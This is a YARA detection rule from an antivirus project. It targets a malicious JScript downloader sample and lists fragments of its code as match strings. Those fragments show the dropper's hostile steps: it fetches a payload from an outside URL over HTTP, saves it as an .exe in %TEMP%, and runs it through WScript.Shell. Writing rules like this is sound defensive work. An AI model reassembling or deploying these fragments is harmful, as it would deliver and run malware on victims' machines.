rule sig_20160329_f32dff4e8583d9311e7c4a35fed6ff5c {
  meta:
    description = "datamaliciousorder - file 20160329_f32dff4e8583d9311e7c4a35fed6ff5c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c42838e9c745823d6b6cb0fb6a132f9d2c059bd075e9b023c5605b6d4f2df369"

  strings:
    $s1  = "function M() {return j[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"41aidKFEgx4YonA.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[KV](Jq() * 11); if (lQ[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "var j = function w() {return WScript[Bm](\"WScript.Shell\");}(), ox = 11;" fullword ascii
    $s4  = "function E(FT, a){y = y * 1; return FT - a;};" fullword ascii
    $s5  = "lQ[W](\"GET\", \"http://pasticceriabonci.it/m1psa\", false);" fullword ascii
    $s6  = "function X(){return \"\" + K;};" fullword ascii
    $s7  = "function k() {return ((W0 == true) && (W0 == T)) ? 1 : y;};" fullword ascii
    $s8  = "function R(M0){j[\"Run\"](M0, y, y);};" fullword ascii
    $s9  = "function Js(sy) {var sU = (1, 2, 3, 4, 5, sy); return sU;};" fullword ascii
    $s10 = "return E(dZ, F0);" fullword ascii
    $s11 = "function X0(){return Bm;};" fullword ascii
    $s12 = "function Jq(){return 22;};" fullword ascii
    $s13 = " while (vu){" fullword ascii
    $s14 = "var hj = new this[\"Date\"]();" fullword ascii
    $s15 = "function hw()" fullword ascii
    $s16 = "var r = false;" fullword ascii
    $s17 = "T = true; " fullword ascii
    $s18 = "var T = false;" fullword ascii
    $s19 = "var W0 = false;" fullword ascii
    $s20 = "W0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}